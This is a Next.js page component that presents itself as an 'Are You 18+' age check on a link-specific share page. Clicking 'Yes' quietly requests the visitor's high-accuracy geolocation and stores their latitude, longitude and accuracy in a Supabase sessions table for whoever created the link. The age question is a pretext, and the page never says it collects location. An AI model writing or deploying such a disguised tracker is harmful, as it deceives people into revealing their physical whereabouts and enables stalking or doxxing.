"use client";

import { useState, useEffect } from "react";
import { useParams } from "next/navigation";
import { supabase } from "@/lib/supabaseClient";

export default function SharePage() {
  const params = useParams();
  const id = params.id as string;

  const [status, setStatus] = useState<
    "idle" | "checking" | "requesting" | "done" | "error" | "invalid"
  >("checking");
  const [errorMsg, setErrorMsg] = useState("");

  useEffect(() => {
    const checkSession = async () => {
      const { data, error } = await supabase
        .from("sessions")
        .select("status")
        .eq("id", id)
        .single();

      if (error || !data) {
        setStatus("invalid");
        return;
      }

      if (data.status !== "pending") {
        setStatus("done"); // already responded
      } else {
        setStatus("idle");
      }
    };

    checkSession();
  }, [id]);

  const handleAllow = () => {
    setStatus("requesting");

    if (!navigator.geolocation) {
      setErrorMsg("Your browser does not support geolocation.");
      setStatus("error");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude, accuracy } = position.coords;

        const { error } = await supabase
          .from("sessions")
          .update({
            status: "shared",
            latitude,
            longitude,
            accuracy,
            updated_at: new Date().toISOString(),
          })
          .eq("id", id);

        if (error) {
          setErrorMsg("Failed to send location.");
          setStatus("error");
        } else {
          setStatus("done");
        }
      },
      (err) => {
        setErrorMsg(err.message);
        setStatus("error");
      },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  };

  const handleDecline = async () => {
    await supabase
      .from("sessions")
      .update({ status: "declined", updated_at: new Date().toISOString() })
      .eq("id", id);
    setStatus("done");
  };

  if (status === "checking") return <Centered>Loading...</Centered>;
  if (status === "invalid")
    return <Centered>This link is invalid or has expired.</Centered>;
  if (status === "done")
    return <Centered>Thanks — you can close this page now.</Centered>;
  if (status === "error")
    return <Centered>Something went wrong: {errorMsg}</Centered>;
  if (status === "requesting")
    return (
      <Centered>Requesting location permission from your browser...</Centered>
    );

  return (
    <Centered>
      <h2>
        Are You <span className="text-red-500">18</span>+
      </h2>
      <div
        style={{
          marginTop: 20,
          display: "flex",
          gap: 12,
          justifyContent: "center",
        }}
      >
        <button
          onClick={handleAllow}
          style={{
            padding: "10px 20px",
            background: "#111",
            color: "#fff",
            border: "none",
            borderRadius: 6,
          }}
        >
          Yes
        </button>
        <button
          onClick={handleDecline}
          style={{
            padding: "10px 20px",
            background: "#111",
            color: "#fff",
            border: "none",
            borderRadius: 6,
          }}
        >
          No
        </button>
      </div>
    </Centered>
  );
}

function Centered({ children }: { children: React.ReactNode }) {
  return (
    <main
      style={{
        maxWidth: 400,
        margin: "100px auto",
        textAlign: "center",
        fontFamily: "sans-serif",
      }}
    >
      {children}
    </main>
  );
}
